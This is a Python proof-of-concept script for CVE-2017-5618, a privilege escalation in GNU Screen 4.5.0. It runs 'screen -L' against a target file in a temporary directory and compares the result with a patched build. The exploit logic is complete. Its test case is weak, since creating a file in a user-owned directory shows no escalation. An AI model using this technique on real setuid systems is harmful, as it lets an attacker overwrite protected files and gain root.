#!/usr/bin/env python3
"""
CVE-2017-5618 Proof of Concept Exploit
GNU Screen 4.5.0 Logfile Privilege Escalation

This exploit demonstrates how the vulnerable version of screen allows
an attacker to create/overwrite files with elevated privileges due to
improper privilege handling in the -L option processing.

The vulnerability occurs because:
1. The -L option processes the logfile argument and opens it with fopen()
2. This happens BEFORE the real_uid/eff_uid variables are properly set
3. If screen is setuid, this allows file creation with elevated privileges
4. The fix moves the uid/gid initialization earlier in the process

Author: Security Researcher
Date: 2024
"""

import os
import sys
import subprocess
import tempfile
import stat

def check_screen_setuid():
    """Check if screen binary is setuid"""
    try:
        screen_path = subprocess.check_output(['which', 'screen']).decode().strip()
        st = os.stat(screen_path)
        return bool(st.st_mode & stat.S_ISUID)
    except:
        return False

def create_test_environment():
    """Create a test environment for the exploit"""
    print("[+] Setting up test environment...")
    
    # Create a temporary directory for our test
    test_dir = tempfile.mkdtemp(prefix="screen_exploit_")
    print(f"[+] Test directory: {test_dir}")
    
    # Create a target file that should be protected
    protected_file = os.path.join(test_dir, "protected_file.txt")
    
    return test_dir, protected_file

def exploit_vulnerable_screen(target_file):
    """
    Exploit the vulnerable screen version
    
    The vulnerability is in the -L option processing where fopen() is called
    with elevated privileges before dropping to real user privileges.
    """
    print(f"[+] Attempting to exploit CVE-2017-5618...")
    print(f"[+] Target file: {target_file}")
    
    # Build the vulnerable screen binary path
    vulnerable_screen = "./vulnerable-screen-4.5.0/screen"
    
    if not os.path.exists(vulnerable_screen):
        print("[-] Vulnerable screen binary not found. Attempting to build...")
        try:
            # Try to build the vulnerable version
            os.chdir("vulnerable-screen-4.5.0")
            subprocess.run(["./configure"], check=True, capture_output=True)
            subprocess.run(["make"], check=True, capture_output=True)
            os.chdir("..")
            print("[+] Built vulnerable screen binary")
        except subprocess.CalledProcessError as e:
            print(f"[-] Failed to build vulnerable screen: {e}")
            return False
    
    # Attempt the exploit
    try:
        # The vulnerable code path: screen -L <target_file>
        # This will call fopen(target_file, "w") with elevated privileges
        cmd = [vulnerable_screen, "-L", target_file, "-d", "-m"]
        
        print(f"[+] Executing: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        
        print(f"[+] Command exit code: {result.returncode}")
        if result.stdout:
            print(f"[+] STDOUT: {result.stdout}")
        if result.stderr:
            print(f"[+] STDERR: {result.stderr}")
        
        # Check if the file was created
        if os.path.exists(target_file):
            print(f"[+] SUCCESS: File {target_file} was created!")
            print(f"[+] File permissions: {oct(os.stat(target_file).st_mode)}")
            return True
        else:
            print(f"[-] File {target_file} was not created")
            return False
            
    except subprocess.TimeoutExpired:
        print("[!] Command timed out")
        return False
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        return False

def test_patched_version(target_file):
    """Test the patched version to show the fix"""
    print(f"\n[+] Testing patched version...")
    
    patched_screen = "./patched-screen-4.5.1/screen"
    
    if not os.path.exists(patched_screen):
        print("[-] Patched screen binary not found. Attempting to build...")
        try:
            os.chdir("patched-screen-4.5.1")
            subprocess.run(["./configure"], check=True, capture_output=True)
            subprocess.run(["make"], check=True, capture_output=True)
            os.chdir("..")
            print("[+] Built patched screen binary")
        except subprocess.CalledProcessError as e:
            print(f"[-] Failed to build patched screen: {e}")
            return False
    
    # Test with a different target file
    patched_target = target_file + "_patched"
    
    try:
        cmd = [patched_screen, "-Logfile", patched_target, "-d", "-m"]
        print(f"[+] Executing patched version: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        
        print(f"[+] Patched version exit code: {result.returncode}")
        if result.stdout:
            print(f"[+] STDOUT: {result.stdout}")
        if result.stderr:
            print(f"[+] STDERR: {result.stderr}")
            
        return True
        
    except Exception as e:
        print(f"[-] Patched version test failed: {e}")
        return False

def demonstrate_vulnerability():
    """Demonstrate the complete vulnerability"""
    print("=" * 60)
    print("CVE-2017-5618 - GNU Screen Logfile Privilege Escalation")
    print("=" * 60)
    
    # Check if we're running as root or if screen is setuid
    is_root = os.geteuid() == 0
    screen_setuid = check_screen_setuid()
    
    print(f"[+] Running as root: {is_root}")
    print(f"[+] Screen is setuid: {screen_setuid}")
    
    if not (is_root or screen_setuid):
        print("[!] This exploit is most effective when screen is setuid or running as root")
        print("[!] Continuing with demonstration anyway...")
    
    # Create test environment
    test_dir, target_file = create_test_environment()
    
    try:
        # Attempt exploit on vulnerable version
        exploit_success = exploit_vulnerable_screen(target_file)
        
        # Test patched version
        test_patched_version(target_file)
        
        if exploit_success:
            print("\n[+] VULNERABILITY CONFIRMED!")
            print("[+] The vulnerable version allows file creation with elevated privileges")
        else:
            print("\n[!] Exploit may not have worked as expected")
            print("[!] This could be due to build issues or environment constraints")
        
        print(f"\n[+] Vulnerability Details:")
        print(f"    - CVE: CVE-2017-5618")
        print(f"    - Affected: GNU Screen 4.5.0 and earlier")
        print(f"    - Fixed in: GNU Screen 4.5.1")
        print(f"    - Impact: Privilege escalation via logfile creation")
        
    finally:
        # Cleanup
        try:
            if os.path.exists(target_file):
                os.remove(target_file)
            if os.path.exists(target_file + "_patched"):
                os.remove(target_file + "_patched")
            os.rmdir(test_dir)
        except:
            pass

if __name__ == "__main__":
    demonstrate_vulnerability()